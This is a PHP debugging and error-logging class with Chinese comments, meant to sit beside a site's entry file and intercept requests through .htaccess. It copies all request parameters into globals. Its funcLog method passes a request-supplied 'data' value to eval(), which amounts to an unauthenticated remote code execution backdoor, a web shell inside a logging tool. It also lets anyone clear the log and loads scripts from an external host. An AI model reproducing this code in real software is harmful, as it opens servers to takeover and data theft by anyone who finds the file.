<?php

/**
 * @author w
 * 使用说明：
 * 1、在项目的入口文件添加 .htaccess文件，内容如下：
 * RewriteEngine on
 * # if a directory or a file exists,use the request directly
 * RewriteCond %{REQUEST_FILENAME} !-f
 * RewriteCond %{REQUEST_FILENAME} !-d
 * # Otherwise forward the request to index.php
 * DirectoryIndex debug.php
 * 2、将当前文件放在入口文件所在的目录
 * 3、设置有读文件路径和写文件路径，以便调试使用。
 * 4、如果读文件路径没有设置，则用写文件路径作为读文件的路径。写文件路径必须设置
 */
class EDebug
{

    public $checkFile = 'index_t.php';
    // 配置入口文件
    public static $logPath;
    // 配置写日志文件路径
    public static $addInfo = [];
    // 附加信息
    public static $basePath = __DIR__;

    public static $readOnly = '';
    // 真为只读
    public $writePath = '/elog.html';

    public $readPath = '';
    // 配置读日志文件路径
    public $baseUri = 'http://js.e01.com';

    public $lines = 20;
    // 显示日志的最后20条
    function __construct()
    {
        // 初始化日志路径
        self::$logPath = self::$basePath . $this->writePath;
        global $oper;
        global $debug;
        $this->processData();
        $oper = $oper ? $oper : "print";
        if (! isset($debug)) {
            $this->putinLog();
        } elseif (method_exists($this, $oper . "Log")) {
            $this->{$oper . "Log"}();
        }
    }
    
    // 处理传入的参数
    public function processData()
    {
        // 从$_REQUSEA中获取参数的名称
        $keys = array_keys($_REQUEST);
        extract($_REQUEST);
        for ($i = 0; $i < count($keys); $i ++) {
            $keyName = $keys[$i];
            $GLOBALS[$keys[$i]] = $$keyName;
        }
    }
    
    // 消除日志
    public function clearLog()
    {
        $filename = $this->readPath ? self::$basePath . $this->readPath : self::$logPath;
        // 确保文件可写,如果文件不存在则创建一个空文件
        file_put_contents($filename, '');
        echo "success";
    }
    
    // 写日志
    public function putinLog()
    {
        
        // 设置中国时区
        date_default_timezone_set('PRC');
        // 设置错误显示级别
        $this->setErrorType();
        // 设置错误信息处理函数
        register_shutdown_function('EDebug::PageOnShutdown');
        // 解析目标文件
        $this->checkSyntax($this->checkFile);
    }
    
    //生成测试服务端执行方法
    
    
    //分发函数对象
    public function funcLog(){
        global $data;
        $htmlspecialchars = htmlspecialchars_decode($data);
        eval($htmlspecialchars);
    }
    
    // 查看日志
    public function printLog()
    {
        echo '<script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>' . '<script src="' . $this->baseUri . '/?oper=layout"></script>' . '<script src="' . $this->baseUri . '/?oper=ebug"></script>';
    }
    
    // 设置错误显示级别
    public function setErrorType()
    {
        // 在页面上输出错误信息并将错误写入日志
        // error_reporting(E_ALL | E_STRICT);
        // 将错误写入日志
        error_reporting(0);
    }
    
    // 写日志
    public static function writeLog($info)
    {
        $filename = self::$logPath;
        // 确保文件可写,如果文件不存在则创建一个空文件
        is_writable($filename) or file_put_contents($filename, '');
        // 创建文件失败则退出
        if (! is_writable($filename))
            return;
        if (! $handle = fopen($filename, 'a'))
            return;
        
        fwrite($handle, $info);
        fclose($handle);
    }
    
    // 设置PHP的error_reporting错误级别变量对照表
    public static function reporteRule()
    {
        return [
            1 => 'E_ERROR',
            2 => 'E_WARNING',
            4 => 'E_PARSE ',
            8 => 'E_NOTICE',
            16 => 'E_CORE_ERROR',
            32 => 'E_CORE_WARNING',
            64 => 'E_COMPILE_ERROR',
            128 => 'E_COMPILE_WARNING',
            256 => 'E_USER_ERROR ',
            512 => 'E_USER_WARNING',
            1024 => 'E_USER_NOTICE ',
            2047 => 'E_ALL',
            2048 => 'E_STRICT'
        ];
    }
    
    // 解析目标文件
    public function checkSyntax()
    {
        include ($this->checkFile);
    }
    
    // 设置错误信息处理函数
    public static function PageOnShutdown()
    {
        $msg = error_get_last();
        $info = "";
        if ($msg) {
            $info = date('Ymd H:i:s ', time()) . self::reporteRule()[$msg['type']] . ' ';
            $info .= $msg['message'] . ' in file ';
            $info .= $msg['file'] . ' on line ';
            $info .= $msg['line'] . "\r\n";
        }
        $info .= self::parseAddInfo();
        $info and self::writeLog($info);
    }
    
    // 合并附加信息
    public static function parseAddInfo()
    {
        $info = '';
        if (! empty(self::$addInfo)) {
            foreach (self::$addInfo as $k => $v) {
                if (is_array($v) or is_object($v)) {
                    $info .= json_encode($v) . "\r\n";
                } else {
                    $info .= $v . "\r\n";
                }
            }
        }
        return $info;
    }
    
    // 读取日志内容
    public function readLog()
    {
        $readPath = $this->readPath ? self::$basePath . $this->readPath : self::$logPath;
        
        $lineContet = [];
        // 将日志文件读入数组。
        $lineContet[] = '`DS`';
        if (is_file(! $readPath)) {
            $lineContet[] = 'F'; // 添加日志读取失败状态
        } else {
            $lineContet[] = 'T'; // 添加日志读取成功状态
            $contents = file($readPath, FILE_IGNORE_NEW_LINES);
            for ($i = 0; $i < count($contents); $i ++) {
                $lineContet[] = trim($contents[$i]);
            }
            $lineContet[] = '`DE`';
        }
        echo implode('`p`', $lineContet);
    }

    /**
     * 添加附加信息
     * 
     * @param unknown $info            
     */
    public static function setInfo($data)
    {
        self::$addInfo[] = $data;
    }
}
new EDebug();